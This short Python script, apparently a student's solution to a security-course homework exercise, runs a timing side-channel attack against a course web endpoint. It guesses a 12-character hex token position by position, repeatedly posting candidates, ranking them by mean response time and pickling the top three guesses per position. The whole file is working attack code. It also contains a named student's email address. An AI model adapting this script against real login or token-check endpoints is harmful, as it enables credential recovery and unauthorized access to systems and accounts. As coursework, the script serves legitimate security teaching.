import requests
import json
import pickle
import numpy as np
import operator



hexchars = '0123456789abcdefABCDEF'
    
top_3 = {}
    
token = '************'

for l in range(12):
    top_3[l] = []
    timings = {}
        
    for ch in hexchars:
        timings[ch] = []
        token_chars = list(token)
        token_chars[l] = ch
        token = "".join(token_chars)
        payload = {"email": "mateusz.paluchowski@epfl.ch", "token": token}

        for i in range(5):
            r = requests.post("http://com402.epfl.ch/hw5/ex3", json=payload)
            if r.status_code == 200:
                print(payload)
                print(r.text)
                
            timings[ch] += [r.elapsed.total_seconds()]
            
    mean = {}
    for key in timings:
        mean[key] = np.mean(timings[key])
    top_3_list = sorted(mean.items(), key=operator.itemgetter(1))[::-1][:3]
    top = [char for (char, time) in top_3_list]
    top_3[l] = top
    token_chars = list(token)
    token_chars[l] = top[0]
    token = "".join(token_chars)
        
print(top_3)
with open('top.pickle', 'wb') as handle:
    pickle.dump(top_3, handle, protocol=pickle.HIGHEST_PROTOCOL)
